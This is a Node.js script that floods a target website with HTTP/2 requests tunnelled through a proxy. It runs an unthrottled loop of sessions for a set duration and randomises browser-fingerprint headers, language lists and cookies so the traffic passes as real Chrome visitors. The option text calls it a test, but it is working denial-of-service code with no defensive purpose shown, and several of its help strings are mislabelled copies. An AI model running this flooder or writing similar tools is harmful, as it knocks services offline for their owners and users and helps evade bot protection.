import http from 'http';
import https from 'https';
import tls from 'tls';
import crypto from 'crypto';
import fs from 'fs';
import url from 'url';
import os from 'os';
import http2 from 'http2-wrapper';
import { Buffer } from 'buffer';
import yargs from 'yargs/yargs';
import { hideBin } from 'yargs/helpers';

const argv = yargs(hideBin(process.argv))
	.option('target', {
		alias: 'u',
		describe: 'Target URL',
		demandOption: true,
	})
	.option('time', {
		alias: 'd',
		describe: 'Duration of the test in seconds',
		demandOption: true,
	})
	.option('method', {
		alias: 'm',
		describe: 'Request method',
		default: 'GET',
		demandOption: true,
	})
	.option('ratelimit', {
		alias: 'r',
		describe: 'Rate limit in requests per second',
		default: 0,
	})
	.option('proxyfile', {
		alias: 'p',
		describe: 'Path to a file containing a list of HTTP proxies, one per line',
		default: null,
	})
	.option('cookie', {
		alias: 'c',
		describe: 'Path to a file containing a list of HTTP proxies, one per line',
		default: null,
	})
	.option('postdata', {
		alias: 'k',
		describe: 'JSON data to send in POST request',
		default: null,
	})
	.option('headers', {
		alias: 'h',
		describe: 'Path to a file containing a list of HTTP proxies, one per line',
		default: 'none',
	})
	.option('debug', {
		alias: 'q',
		describe: 'Response mode',
		type: 'boolean',
		default: false,
	}).argv;

const useragent = argv.headers;
let cookie = argv.cookie;
let target = argv.target;
let postdata = argv.postdata;

let hcookie;

const proxies = argv.proxyfile;
const parsed = url.parse(target);

class Utils {
	static randNumber(min, max) {
		return Math.floor(Math.random() * (max - min + 1)) + min;
	}

	static randString(length = 16) {
		const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
		let token = '';
		for (let i = 0; i < length; i++) {
			token += chars.charAt(Math.floor(Math.random() * chars.length));
		}
		return token;
	}
}

const headers = (hcookie, index) => {
	const finalCookie = [cookie, hcookie].filter(Boolean).join('; ');

	const saveindex = Utils.randString(25);
	const axyet = ['/', '[', '+', ']', '-', '_', ')', '(', '=', ';', '?', '|', saveindex];
	const randomIndex = Math.floor(Math.random() * axyet.length);

	var regex = /Chrome\/(\d+)/;
	var matches = useragent.match(regex);
	var chromeVersion = matches[1];

	return {
		':method': argv.method,
		':authority': parsed.host,
		':scheme': 'https',
		':path': parsed.path,
		'sec-ch-ua': `"Chromium";v="${chromeVersion}", "Not${axyet[randomIndex]}A;Brand";v="${Utils.randNumber(
			9,
			99
		)}", "Google Chrome";v="${chromeVersion}"`,
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': `"Linux"`,
		'upgrade-insecure-requests': '1',
		'user-agent': useragent,
		'accept':
			'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		...(Math.random() < 0.5 ? { 'accept-charset': `${saveindex}` } : {}),
		...(Math.random() < 0.5 ? { 'accept-features': 'gzip, deflate' } : {}),
		...(Math.random() < 0.5
			? {
					'accept-patch':
						'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			  }
			: {}),
		...(Math.random() < 0.5 ? { 'accept-ranges': 'bytes' } : {}),
		'sec-fetch-site': 'none',
		'sec-fetch-mode': 'navigate',
		'sec-fetch-user': '?1',
		'sec-fetch-dest': 'document',
		'accept-encoding': 'gzip, deflate, br',
		...(Math.random() < 0.5 ? { te: 'trailers' } : {}),
		'accept-language': (() => {
			const language = [
				'ru-RU',
				'ru',
				'en-US',
				'fr-FR',
				'ar',
				'az',
				'be',
				'bg',
				'bn',
				'bs',
				'ca',
				'cs',
				'cy',
				'da',
				'de',
				'el',
				'en-GB',
				'en-AU',
				'en-CA',
				'en-IN',
				'en-NZ',
				'en-ZA',
				'eo',
				'es',
				'et',
				'eu',
				'fa',
				'fi',
				'fil',
				'fo',
				'fr-BE',
				'fr-CA',
				'fr-CH',
				'fy',
				'ga',
				'gd',
				'gl',
				'he',
				'hi',
				'hr',
				'hu',
				'hy',
				'id',
				'is',
				'it',
				'ja',
				'jv',
				'ka',
				'kk',
				'km',
				'kn',
				'ko',
				'ky',
				'la',
				'lb',
				'lo',
				'lt',
				'lv',
				'mk',
				'ml',
				'mn',
				'mr',
				'ms',
				'mt',
				'nb',
				'ne',
				'nl',
				'nn',
				'no',
				'oc',
				'pl',
				'ps',
				'pt',
				'pt-BR',
				'pt-PT',
				'ro',
				'ru',
				'se',
				'si',
				'sk',
				'sl',
				'sq',
				'sr',
				'sv',
				'sw',
				'ta',
				'te',
				'th',
				'tl',
				'tr',
				'tt',
				'ug',
				'uk',
				'ur',
				'uz',
				'vi',
				'xh',
				'zh',
				'zh-CN',
				'zh-HK',
				'zh-TW',
				'zu',
				'ab',
				'aa',
				'af',
				'am',
				'an',
				'as',
				'av',
				'ae',
				'ay',
				'ba',
				'bm',
				'bh',
				'bi',
				'bo',
				'br',
				'co',
				'cr',
				'ch',
				'cu',
				'cv',
				'dz',
				'ee',
				'ff',
				'gl',
				'gn',
				'gu',
				'ht',
				'hz',
				'ho',
				'ii',
				'io',
				'iu',
				'ki',
				'kj',
				'kr',
				'ks',
				'ku',
				'kv',
				'lg',
				'li',
				'ln',
				'lt',
				'lu',
				'lv',
				'mg',
				'mh',
				'mi',
				'mk',
				'ml',
				'mn',
				'mr',
				'ms',
				'na',
				'nb',
				'nd',
				'ng',
				'nl',
				'nn',
				'no',
				'nr',
				'nv',
				'ny',
				'oc',
				'oj',
				'or',
				'os',
				'pa',
				'pi',
				'qu',
				'rm',
				'rn',
				'rw',
				'sa',
				'sc',
				'sd',
				'se',
				'sg',
				'si',
				'sk',
				'sl',
				'sm',
				'sn',
				'so',
				'sq',
				'ss',
				'st',
				'su',
				'sv',
				'sw',
				'ta',
				'te',
				'tg',
				'ti',
				'tk',
				'tn',
				'to',
				'ts',
				'tt',
				'tw',
				'ty',
				'ug',
				'uk',
				'ur',
				'uz',
				've',
				'vo',
				'wa',
				'wo',
				'xh',
				'yi',
				'yo',
				'za',
				'zu',
			]
				.sort(() => Math.random() - 0.5)
				.map((lang) => `${lang};q=${(Math.random() * 0.6 + 0.4).toFixed(1)}`)
				.join(',');
			return language[Math.floor(Math.random() * language.length)];
		})(),
		'cookie': finalCookie,
		...(Math.random() < 0.5 ? { dnt: '1' } : {}),
		...(Math.random() < 0.5
			? {
					referer: `https://${parsed.host}.com/${
						['index', 'home', 'login', 'register'][Math.floor(Math.random() * 4)]
					}`,
			  }
			: {}),
		...(Math.random() < 0.5 ? { 'x-aspnet-version': `${saveindex}` } : {}),
	};
};

const agent = new http.Agent({
	keepAlive: true,
	maxSockets: Infinity,
	maxFreeSockets: Infinity,
	timeout: argv.time * 1000,
});

const work = () => {
	const [proxyHost, proxyPort] = proxies.split(':');

	const request = http.get({
		method: 'CONNECT',
		host: proxyHost,
		port: proxyPort,
		agent,
		path: `${parsed.host}:443`,
		headers: { Connection: 'Keep-Alive' },
		rejectUnauthorized: true,
	});

	request.on('error', request.destroy);

	request.on('connect', (res, socket, { head }) => {
		if (head?.length) return socket.destroy();

		const ciphers = [
			'TLS_AES_128_GCM_SHA256',
			'TLS_CHACHA20_POLY1305_SHA256',
			'TLS_AES_256_GCM_SHA384',
			'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
		].join(':');
		const sigalgs =
			'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512';

		const sessionOptions = {
			createConnection: (authority, option) =>
				tls.connect({
					...option,
					socket,
					servername: parsed.host,
					session: head,
					agent,
					secure: true,
					requestOCSP: true,
					ALPNProtocols: ['h2', 'http/1.1'],
					ciphers: ciphers,
					sigalgs: sigalgs,
					requestCert: true,
				}),
			settings: {
				headerTableSize: 65535,
				enablePush: false,
				maxConcurrentStreams: 1000,
				initialWindowSize: 1024 * 1024 * Utils.randNumber(4, 64),
				maxHeaderListSize: 262144,
			},
		};

		const sessionState = { flags: 0 };

		const session = http2.connect(`https://${parsed.host}`, sessionOptions, () => {
			session.setLocalWindowSize(Utils.randNumber(15663105, 2147483647));
		});

		let activeRequests = 0;
		let timeoutHandle;

		const resetTimeout = () => {
			clearTimeout(timeoutHandle);
			timeoutHandle = setTimeout(() => activeRequests && session.destroy(), 3000);
		};

		const closeSessionIfDone = () => {
			if (!activeRequests) {
				sessionState.flags |= 1;
				session.destroy();
			}
		};

		session.on('error', () => {
			sessionState.flags |= 1;
			session.destroy();
		});

		session.on('connect', () => {
			Array.from({ length: argv.ratelimit }).forEach((_, index) => {
				const isFirstRequest = index === 0;
				const headersData = getHeaders(hcookie, isFirstRequest);
				requestHandler(session, postdata, headersData, index);
			});
			resetTimeout();
		});

		const getHeaders = (hcookie, index) => headers(hcookie, index);
		const requestHandler = (session, postdata, headersData, index) => {
			const { method } = argv;

			activeRequests++;
			resetTimeout();

			const req = session.request(headersData);

			req.setEncoding('utf8');

			if (method === 'POST') {
				req.write(JSON.stringify(postdata));
			}

			req.on('response', (response) => {
				const { headers } = response;
				if (headers && 'set-cookie' in headers) {
					hcookie = headers['set-cookie'].map((cookie) => cookie.split(';')[0]).join('; ');
				}
			});

			req.on('end', finalizeRequest);
			req.on('error', (err) => {
				finalizeRequest();
			});

			req.end();

			function finalizeRequest() {
				activeRequests--;
				closeSessionIfDone();
			}
		};
	});

	request.end();
};

setInterval(work);
setTimeout(() => process.exit(console.log(`Worker ${process.pid} exiting...`)), argv.time * 1000);
